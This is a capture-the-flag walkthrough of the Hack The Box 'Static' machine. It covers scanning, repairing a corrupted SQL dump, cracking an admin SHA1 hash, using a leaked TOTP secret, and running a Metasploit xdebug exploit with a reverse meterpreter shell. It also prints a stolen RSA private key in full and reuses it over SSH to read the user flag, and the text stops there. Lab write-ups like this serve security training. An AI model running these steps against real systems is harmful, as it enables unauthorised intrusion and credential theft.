@@ -1,0 +1,1325 @@
+---
+title: Hackthebox Static Writeup
+slug: hackthebox-static-writeup
+description: Hackthebox release new machine called static, in this machine we need to fix the gz format file first after fixing that file creads for login page after that we find butch of vpn file to download downloading 1 file and fix that file and connect with vpn we got an another page which running php xdebug exploit that to get rev shell a hidden service is running on server port forward that and find running PHP-FPM vulnerable version exploit get to get shell as user find a binary which running as root exploit that to get root.
+date: 2021-06-25
+image: hackthebox-static-writeup.webp
+---
+
+import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
+import { components as MDXComponents } from '../../components/mdxComponents';
+export const components = MDXComponents;
+
+## Nmap
+
+```js
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static]
+└──╼ [★]$ nmap -sC -sV -oA nmap/result 10.10.10.246
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-20 23:44 CDT
+Nmap scan report for 10.10.10.246
+Host is up (0.080s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
+|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
+|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)
+2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
+|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
+|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
+8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
+| http-robots.txt: 2 disallowed entries
+|_/vpn/ /.ftp_uploads/
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.83 seconds
+```
+
+There are three ports open `22:ssh,2222:ssh(Strange) 8080:http`
+
+## Port-80
+
+Blank Page `Strange`.
+
+<FixTheImageURL src='web.png' slug='hackthebox-static-writeup' />
+
+Now let's use `gobuster`.
+
+```js
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static]
+└──╼ [★]$ gobuster dir -u http://10.10.10.246:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php,txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.246:8080/
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              txt,php
+[+] Timeout:                 10s
+===============================================================
+2021/06/20 23:47:42 Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 200) [Size: 0]
+/robots.txt           (Status: 200) [Size: 55]
+```
+
+Found `robots.txt` let's check it out what directories `disallow` there.
+
+<FixTheImageURL src='web1.png' slug='hackthebox-static-writeup' />
+
+## **/vpn/**
+
+There is a `login` page and we don't have `creads` for that.
+
+<FixTheImageURL src='web2.png' slug='hackthebox-static-writeup' />
+
+## **/.ftp_uploads/**
+
+Two files first is `db.sql.gz` and second is `warning.txt`
+
+<FixTheImageURL src='web3.png' slug='hackthebox-static-writeup' />
+
+Warning tell us about the `db.sql.gz` file that been `corrupted` while transfer!!
+
+<FixTheImageURL src='web4.png' slug='hackthebox-static-writeup' />
+
+After some `google` i found a tool for `fix` the corrupted `gz` files.
+
+Link : https://github.com/yonjar/fixgz
+
+But first install the `requirements` for that.
+
+```js
+apt-get install g++
+```
+
+Now let's `git` clone the tool.
+
+```js
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www]
+└──╼ [★]$ git clone https://github.com/yonjar/fixgz.git
+Cloning into 'fixgz'...
+remote: Enumerating objects: 10, done.
+remote: Counting objects: 100% (10/10), done.
+remote: Compressing objects: 100% (9/9), done.
+remote: Total 10 (delta 1), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (10/10), 9.19 KiB | 9.19 MiB/s, done.
+Resolving deltas: 100% (1/1), done.
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www]
+└──╼ [★]$ cd fixgz/
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www/fixgz]
+└──╼ [★]$ ls -al
+total 32
+drwxr-xr-x 1 root root    62 Jun 20 23:54 .
+drwxr-xr-x 1 root root    28 Jun 20 23:54 ..
+-rw-r--r-- 1 root root  1394 Jun 20 23:54 fixgz.cpp
+-rw-r--r-- 1 root root 22763 Jun 20 23:54 fixgz.exe
+drwxr-xr-x 1 root root   138 Jun 20 23:54 .git
+-rw-r--r-- 1 root root   135 Jun 20 23:54 README.md
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www/fixgz]
+└──╼ [★]$
+```
+
+let's `compile` that `cpp` file.
+
+```js
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www/fixgz]
+└──╼ [★]$ g++ fixgz.cpp -o fixgz
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www/fixgz]
+└──╼ [★]$ ls
+fixgz  fixgz.cpp  fixgz.exe  README.md
+```
+
+Now let's `fix` the corrupted `gz` file.
+
+```js
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www/fixgz]
+└──╼ [★]$ ./fixgz db.sql.gz db.gz
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www/fixgz]
+└──╼ [★]$ ls
+db.gz  db.sql.gz  fixgz  fixgz.cpp  fixgz.exe  README.md
+```
+
+Now it's fixed let's `extract` the gz file.
+
+```js
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www/fixgz]
+└──╼ [★]$ gunzip db.gz
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www/fixgz]
+└──╼ [★]$ ls -al
+total 60
+drwxr-xr-x 1 root   root      94 Jun 20 23:58 .
+drwxr-xr-x 1 root   root      10 Jun 20 23:55 ..
+-rw-r--r-- 1 root   root     355 Jun 20 23:58 db
+-rw-r--r-- 1 dedsec dedsec   262 Jun 20 23:51 db.sql.gz
+-rwxr-xr-x 1 root   root   16904 Jun 20 23:55 fixgz
+-rw-r--r-- 1 root   root    1394 Jun 20 23:54 fixgz.cpp
+-rw-r--r-- 1 root   root   22763 Jun 20 23:54 fixgz.exe
+drwxr-xr-x 1 root   root     138 Jun 20 23:54 .git
+-rw-r--r-- 1 root   root     135 Jun 20 23:54 README.md
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www/fixgz]
+└──╼ [★]$ cat db
+CREATE DATABASE static;
+USE static;
+CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) );
+INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www/fixgz]
+└──╼ [★]$
+```
+
+Found `username(admin)` and `hash(d033e22ae348aeb5660fc2140aec35850c4da997)` and a `totp(orxxi4c7orxwwzlo)`
+
+<FixTheImageURL src='cmd.png' slug='hackthebox-static-writeup' />
+
+Now let's try to `crack` the **hash(d033e22ae348aeb5660fc2140aec35850c4da997)**.
+
+```js
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www/fixgz]
+└──╼ [★]$ vim hash
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www/fixgz]
+└──╼ [★]$ cat hash
+d033e22ae348aeb5660fc2140aec35850c4da997
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www/fixgz]
+└──╼ [★]$ john hash
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
+Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
+Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
+Use the "--format=ripemd-160" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
+Use the "--format=has-160" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
+Warning: no OpenMP support for this hash type, consider --fork=8
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+admin            (?)
+1g 0:00:00:00 DONE 2/3 (2021-06-21 00:00) 50.00g/s 141200p/s 141200c/s 141200C/s Winnie..admin1
+Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
+Session completed
+```
+
+Got the **username(admin)** & **password(admin)** let's try to login in inside `/vpn/login.php`
+
+<FixTheImageURL src='web5.png' slug='hackthebox-static-writeup' />
+
+Admin account has `2FA` enabled.
+
+<FixTheImageURL src='web6.png' slug='hackthebox-static-writeup' />
+
+But the good news is we have the `secret` **totp(orxxi4c7orxwwzlo)**
+
+<FixTheImageURL src='web7.png' slug='hackthebox-static-writeup' />
+
+Link : https://addons.mozilla.org/en-US/firefox/addon/auth-helper/
+
+Let's use this `extension` and get the `OTP`.
+
+<FixTheImageURL src='web8.png' slug='hackthebox-static-writeup' />
+
+Copy the `OPT` and send it.
+
+<FixTheImageURL src='web9.png' slug='hackthebox-static-writeup' />
+
+Now we are inside `Support` Portal
+
+<FixTheImageURL src='web10.png' slug='hackthebox-static-writeup' />
+
+Let's type `web` and get the `web.ovpn` file.
+
+<FixTheImageURL src='web11.png' slug='hackthebox-static-writeup' />
+
+Now let's connect with `web.ovpn` file.
+
+But it's giving us `error` let's check the `file`.
+
+<FixTheImageURL src='cmd1.png' slug='hackthebox-static-writeup' />
+
+We see that it's want `vpn.static.htb`
+
+<FixTheImageURL src='cmd2.png' slug='hackthebox-static-writeup' />
+
+let's add this inside `/etc/hosts`.
+
+```js
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       parrot
+
+#custom
+10.10.10.246    vpn.static.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+Now let's `try` to connect.
+
+```js
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       parrot
+
+#custom
+10.10.10.246    vpn.static.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static/www]
+└──╼ [★]$ openvpn web.ovpn
+2021-06-21 00:16:09 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:AES-128-GCM). Future OpenVPN version will ignore --cipher for cipher negotiations. Add 'AES-256-CBC' to --data-ciphers or change --cipher 'AES-256-CBC' to --data-ciphers-fallback 'AES-256-CBC' to silence this warning.
+2021-06-21 00:16:09 OpenVPN 2.5.1 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Feb 24 2021
+2021-06-21 00:16:09 library versions: OpenSSL 1.1.1k  25 Mar 2021, LZO 2.10
+2021-06-21 00:16:09 Outgoing Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
+2021-06-21 00:16:09 Incoming Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
+2021-06-21 00:16:09 TCP/UDP: Preserving recently used remote address: [AF_INET]10.10.10.246:1194
+2021-06-21 00:16:09 Socket Buffers: R=[212992->212992] S=[212992->212992]
+2021-06-21 00:16:09 UDP link local: (not bound)
+2021-06-21 00:16:09 UDP link remote: [AF_INET]10.10.10.246:1194
+2021-06-21 00:16:09 NOTE: UID/GID downgrade will be delayed because of --client, --pull, or --up-delay
+2021-06-21 00:16:09 TLS: Initial packet from [AF_INET]10.10.10.246:1194, sid=bfd7f5e9 c2d9fd8d
+2021-06-21 00:16:09 VERIFY OK: depth=1, CN=static-gw
+2021-06-21 00:16:09 VERIFY KU OK
+2021-06-21 00:16:09 Validating certificate extended key usage
+2021-06-21 00:16:09 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication
+2021-06-21 00:16:09 VERIFY EKU OK
+2021-06-21 00:16:09 VERIFY OK: depth=0, CN=static-gw
+2021-06-21 00:16:09 Control Channel: TLSv1.3, cipher TLSv1.3 TLS_AES_256_GCM_SHA384, 2048 bit RSA
+2021-06-21 00:16:09 [static-gw] Peer Connection Initiated with [AF_INET]10.10.10.246:1194
+2021-06-21 00:16:10 SENT CONTROL [static-gw]: 'PUSH_REQUEST' (status=1)
+2021-06-21 00:16:10 PUSH: Received control message: 'PUSH_REPLY,route 172.17.0.0 255.255.255.0,route-gateway 172.30.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 172.30.0.9 255.255.0.0,peer-id 0,cipher AES-256-GCM'
+2021-06-21 00:16:10 OPTIONS IMPORT: timers and/or timeouts modified
+2021-06-21 00:16:10 OPTIONS IMPORT: --ifconfig/up options modified
+2021-06-21 00:16:10 OPTIONS IMPORT: route options modified
+2021-06-21 00:16:10 OPTIONS IMPORT: route-related options modified
+2021-06-21 00:16:10 OPTIONS IMPORT: peer-id set
+2021-06-21 00:16:10 OPTIONS IMPORT: adjusting link_mtu to 1624
+2021-06-21 00:16:10 OPTIONS IMPORT: data channel crypto options modified
+2021-06-21 00:16:10 Data Channel: using negotiated cipher 'AES-256-GCM'
+2021-06-21 00:16:10 Outgoing Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
+2021-06-21 00:16:10 Incoming Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
+2021-06-21 00:16:10 net_route_v4_best_gw query: dst 0.0.0.0
+2021-06-21 00:16:10 net_route_v4_best_gw result: via 192.168.29.1 dev eth0
+2021-06-21 00:16:10 ROUTE_GATEWAY 192.168.29.1/255.255.255.0 IFACE=eth0 HWADDR=00:0c:29:26:98:2a
+2021-06-21 00:16:10 TUN/TAP device tun9 opened
+2021-06-21 00:16:10 net_iface_mtu_set: mtu 1500 for tun9
+2021-06-21 00:16:10 net_iface_up: set tun9 up
+2021-06-21 00:16:10 net_addr_v4_add: 172.30.0.9/16 dev tun9
+2021-06-21 00:16:10 net_route_v4_add: 172.17.0.0/24 via 172.30.0.1 dev [NULL] table 0 metric -1
+2021-06-21 00:16:10 GID set to nogroup
+2021-06-21 00:16:10 UID set to nobody
+2021-06-21 00:16:10 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
+2021-06-21 00:16:10 Initialization Sequence Completed
+```
+
+Now let's go to this `web` ip.
+
+<FixTheImageURL src='web12.png' slug='hackthebox-static-writeup' />
+
+But it's `loading` and we can't see the `web` page.
+
+<FixTheImageURL src='web13.png' slug='hackthebox-static-writeup' />
+
+We see in the `image` that we have two `interface` first tun0 second `tun9` but in tun9 we have the ip `172.30.0.9` and the web page we want to access that's ip is `172.20.0.10`
+
+<FixTheImageURL src='cmd3.png' slug='hackthebox-static-writeup' />
+
+So we want to add the `route` for access the `web` page in `tun9` interface.
+
+```js
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static]
+└──╼ [★]$ ip route add 172.20.0.0/24 dev tun9
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static]
+└──╼ [★]$
+```
+
+And now we can `access` the web page.
+
+Let's go to `info.php`
+
+<FixTheImageURL src='web14.png' slug='hackthebox-static-writeup' />
+
+And we have the `phpinfo` page.
+
+<FixTheImageURL src='web15.png' slug='hackthebox-static-writeup' />
+
+Found the `xdebug` let's check the `exploit` for that.
+
+<FixTheImageURL src='web16.png' slug='hackthebox-static-writeup' />
+
+Got the `metasploit` module let's try to `exploit` with that.
+
+Link : https://www.rapid7.com/db/modules/exploit/unix/http/xdebug_unauth_exec/
+
+```js
+msf6 > use exploit/unix/http/xdebug_unauth_exec
+msf6 exploit(unix/http/xdebug_unauth_exec) > set PATH /vpn/login.php
+msf6 exploit(unix/http/xdebug_unauth_exec) > set RHOSTS 172.20.0.10
+msf6 exploit(unix/http/xdebug_unauth_exec) > set LHOST tun9
+msf6 exploit(unix/http/xdebug_unauth_exec) > set LPORT 9001
+```
+
+Here is the `list`.
+
+```js
+msf6 exploit(unix/http/xdebug_unauth_exec) > options
+
+Module options (exploit/unix/http/xdebug_unauth_exec):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   PATH     /vpn/login.php   yes       Path to target webapp
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   172.20.0.10      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    80               yes       The target port (TCP)
+   SRVHOST  0.0.0.0          yes       Callback host for accepting connections
+   SRVPORT  9000             yes       Port to listen for the debugger
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                     no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  tun9             yes       The listen address (an interface may be specified)
+   LPORT  9001             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+```
+
+Now let's run the `exploit`.
+
+Boom💥 we got the `shell`.
+
+<FixTheImageURL src='cmd4.png' slug='hackthebox-static-writeup' />
+
+```js
+msf6 exploit(unix/http/xdebug_unauth_exec) > options
+
+Module options (exploit/unix/http/xdebug_unauth_exec):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   PATH     /vpn/login.php   yes       Path to target webapp
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   172.20.0.10      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    80               yes       The target port (TCP)
+   SRVHOST  0.0.0.0          yes       Callback host for accepting connections
+   SRVPORT  9000             yes       Port to listen for the debugger
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                     no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  tun9             yes       The listen address (an interface may be specified)
+   LPORT  9001             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(unix/http/xdebug_unauth_exec) > run
+
+[*] Started reverse TCP handler on 172.30.0.9:9001
+[*] 172.20.0.10:80 - Waiting for client response.
+[*] 172.20.0.10:80 - Receiving response
+[*] 172.20.0.10:80 - Shell might take upto a minute to respond.Please be patient.
+[*] 172.20.0.10:80 - Sending payload of size 2026 bytes
+[*] Sending stage (39282 bytes) to 172.30.0.1
+[*] Meterpreter session 2 opened (172.30.0.9:9001 -> 172.30.0.1:53424) at 2021-06-21 00:56:43 -0500
+
+meterpreter > shell
+Process 381 created.
+Channel 0 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+And inside `/home/www-data/.ssh` we got the `id_rsa` of www-data user so let's use `ssh` for more `stable` shell.
+
+```js
+pwd
+/home/www-data/.ssh
+ls -al
+total 20
+drwx------ 2 www-data www-data 4096 Jun 14 07:54 .
+drwxr-x--- 4 www-data www-data 4096 Jun 14 08:02 ..
+-rw-r--r-- 1 www-data www-data  390 Jun 14 07:54 authorized_keys
+-rw------- 1 www-data www-data 1675 Jun 14 07:34 id_rsa
+-rw-r--r-- 1 www-data www-data  390 Jun 14 07:34 id_rsa.pub
+cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/
+nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ
+QEHYKteL1D+hJ80NDd7fJTtQgzT4yBDwrVKwIUSETMfWgzJ5z24LN5s/rcQYgl3i
+VKmls3lsod8ilakdDoYEYt12L4ST/exEoVl0AyD9y8m651q40k1Gz4WzPnaHAlnj
+mL6CANfiNAJoc8WnqZN5ruSrWhmivmDbKLlDCO5bCCzi2zMHJKqQkcBxdWk60Qhi
+17UJMV3mKVQRprvpeTR2jCMykH81n2KU46doSQIDAQABAoIBAADCHxWtkOhW2uQA
+cw2T91N3I86QJLiljb8rw8sj17nz4kOAUyhTKbdQ102pcWkqdCcCuA6TrYhkmMjl
+pXvxXAvJKXD3dkZeTNohEL4Dz8mSjuJqPi9JDWo6FHrTL9Vg26ctIkiUChou2qZ9
+ySAWqCO2h3NvVMpsKBwjHU858+TASlo4j03FJOdmROmUelcqmRimWxgneHBAHEZj
+GqDuPjmPmw7pbThqlETyosrbaB3rROzUp9CKAHzYB1BvOTImDsb6qQ+GdKwewAQf
+j60myPuxl4qgY8O2yqLFUH3/ovtPTKqHJSUFBO23wzS1qPLupzu1GVXwlsdlhRWA
+Amvx+AECgYEA6OOd9dgqXR/vBaxDngWB6ToVysWDjO+QsjO4OpFo7AvGhMRR+WpK
+qbZyJG1iQB0nlAHgYHEFj4It9iI6NCdTkKyg2UzZJMKJgErfgI0Svkh/Kdls23Ny
+gxpacxW3d2RlyAv4m2hG4n82+DsoPcN+6KxqGRQxWywXtsBsYkRb+wkCgYEA53jg
++1CfGEH/N2TptK2CCUGB28X1eL0wDs83RsU7Nbz2ASVQj8K0MlVzR9CRCY5y6jcq
+te1YYDiuFvT+17ENSe5fDtNiF1LEDfp45K6s4YU79DMp6Ot84c2fBDIh8ogH0D7C
+CFdjXCI3SIlvc8miyivjRHoyJYJz/cO94DsTE0ECgYA1HlWVEWz4OKRoAtaZYGA1
+Ng5qZYqPxsSWIL3QfgIUdMse1ThtTxUgiICYVmqmfP/d/l+TH7RI+0RIc54a7y1c
+PkOhzKlqfQSnwmwgAg1YYWi/vtvZYgeoZ4Zh4X4rOTcN3c0ihTJFzwZWsAeJruFv
+aIP6nGR1iyUNhe4yq6zfIQKBgANYQNAA2zurgHeZcrMUqsNdefXmB2UGPtKH9gGE
+yhU9tMRReLeLFbWAfJj2D5J2x3xQ7cIROuyxBPr58VDGky2VTzRUo584p/KXwvVy
+/LaJiVM/BgUCmhxdL0YNP2ZUxuAgeAdM0/e52time8DNkhefyLntlhnqp6hsEqtR
+zzXBAoGBANB6Wdk/X3riJ50Bia9Ai7/rdXUpAa2B4pXARnP1/tw7krfPM/SCMABe
+sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
+s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau
+-----END RSA PRIVATE KEY-----
+```
+
+## id_rsa www-data
+
+```js
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/
+nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ
+QEHYKteL1D+hJ80NDd7fJTtQgzT4yBDwrVKwIUSETMfWgzJ5z24LN5s/rcQYgl3i
+VKmls3lsod8ilakdDoYEYt12L4ST/exEoVl0AyD9y8m651q40k1Gz4WzPnaHAlnj
+mL6CANfiNAJoc8WnqZN5ruSrWhmivmDbKLlDCO5bCCzi2zMHJKqQkcBxdWk60Qhi
+17UJMV3mKVQRprvpeTR2jCMykH81n2KU46doSQIDAQABAoIBAADCHxWtkOhW2uQA
+cw2T91N3I86QJLiljb8rw8sj17nz4kOAUyhTKbdQ102pcWkqdCcCuA6TrYhkmMjl
+pXvxXAvJKXD3dkZeTNohEL4Dz8mSjuJqPi9JDWo6FHrTL9Vg26ctIkiUChou2qZ9
+ySAWqCO2h3NvVMpsKBwjHU858+TASlo4j03FJOdmROmUelcqmRimWxgneHBAHEZj
+GqDuPjmPmw7pbThqlETyosrbaB3rROzUp9CKAHzYB1BvOTImDsb6qQ+GdKwewAQf
+j60myPuxl4qgY8O2yqLFUH3/ovtPTKqHJSUFBO23wzS1qPLupzu1GVXwlsdlhRWA
+Amvx+AECgYEA6OOd9dgqXR/vBaxDngWB6ToVysWDjO+QsjO4OpFo7AvGhMRR+WpK
+qbZyJG1iQB0nlAHgYHEFj4It9iI6NCdTkKyg2UzZJMKJgErfgI0Svkh/Kdls23Ny
+gxpacxW3d2RlyAv4m2hG4n82+DsoPcN+6KxqGRQxWywXtsBsYkRb+wkCgYEA53jg
++1CfGEH/N2TptK2CCUGB28X1eL0wDs83RsU7Nbz2ASVQj8K0MlVzR9CRCY5y6jcq
+te1YYDiuFvT+17ENSe5fDtNiF1LEDfp45K6s4YU79DMp6Ot84c2fBDIh8ogH0D7C
+CFdjXCI3SIlvc8miyivjRHoyJYJz/cO94DsTE0ECgYA1HlWVEWz4OKRoAtaZYGA1
+Ng5qZYqPxsSWIL3QfgIUdMse1ThtTxUgiICYVmqmfP/d/l+TH7RI+0RIc54a7y1c
+PkOhzKlqfQSnwmwgAg1YYWi/vtvZYgeoZ4Zh4X4rOTcN3c0ihTJFzwZWsAeJruFv
+aIP6nGR1iyUNhe4yq6zfIQKBgANYQNAA2zurgHeZcrMUqsNdefXmB2UGPtKH9gGE
+yhU9tMRReLeLFbWAfJj2D5J2x3xQ7cIROuyxBPr58VDGky2VTzRUo584p/KXwvVy
+/LaJiVM/BgUCmhxdL0YNP2ZUxuAgeAdM0/e52time8DNkhefyLntlhnqp6hsEqtR
+zzXBAoGBANB6Wdk/X3riJ50Bia9Ai7/rdXUpAa2B4pXARnP1/tw7krfPM/SCMABe
+sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
+s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau
+-----END RSA PRIVATE KEY-----
+```
+
+let's login with `ssh` now
+
+But it's doesn't work on `default` ssh port.
+
+```js
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static]
+└──╼ [★]$ vim id_rsa_www-data
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static]
+└──╼ [★]$ chmod 600 id_rsa_www-data
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static]
+└──╼ [★]$ ssh -i id_rsa_www-data www-data@10.10.10.246
+The authenticity of host '10.10.10.246 (10.10.10.246)' can't be established.
+ECDSA key fingerprint is SHA256:JT8cPLAcOoDDuERFqP/Ap/sGDqquy6BK/8fkFO2QFJc.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.246' (ECDSA) to the list of known hosts.
+www-data@10.10.10.246's password:
+```
+
+Let's try with `custom` port of ssh `2222` which we see inside `nmap` scan.
+
+And we got the `user.txt`
+
+```js
+┌───[us-free-1]─[10.10.14.9]─[root@parrot]─[~/Desktop/HTB/Static]
+└──╼ [★]$ ssh -i id_rsa_www-data www-data@10.10.10.246 -p 2222
+The authenticity of host '[10.10.10.246]:2222 ([10.10.10.246]:2222)' can't be established.
+ECDSA key fingerprint is SHA256:SO5uMKk4fPWk/kDc0dLD5Uf7dlyIes4r6s26waZlxkQ.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.10.246]:2222' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-16-amd64 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Mon Jun 21 04:25:32 2021 from 10.10.14.9
+www-data@web:~$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@web:~$ ls
+www-data@web:~$ cd ../
+www-data@web:/home$ ls
+user.txt  www-data
+www-data@web:/home$ cat user.txt
+9b7c385f4aa85112baef80ee5513fe55
